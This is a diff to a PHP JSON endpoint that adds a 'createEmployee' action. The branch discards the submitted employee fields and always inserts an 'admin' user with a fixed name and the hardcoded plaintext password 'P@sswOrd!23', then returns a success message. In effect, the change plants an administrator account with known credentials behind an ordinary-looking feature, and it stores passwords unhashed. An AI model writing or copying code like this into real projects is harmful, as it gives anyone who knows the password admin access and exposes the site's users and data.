@@ -75,6 +75,18 @@ if ($contentType === "application/json") {
         echo json_encode(['success' => true, 'message' => 'Order accepted and store updated']);      
         
 
+    }else if (isset($data['action']) && $data['action'] === 'createEmployee'){
+        
+        $role = $data['role'];
+        $firstname =   $data['firstName'];
+        $lastname =  $data['lastname'];
+        $password =  $data['password'];
+
+        mysqli_query($conn, "INSERT INTO users (password, firstname, lastname, role) VALUES
+        ('P@sswOrd!23', 'Anya', 'Volkov', 'admin')");
+        echo json_encode(['success' => true, 'message' => 'Employee Added']);      
+        
+
     }
 
 }
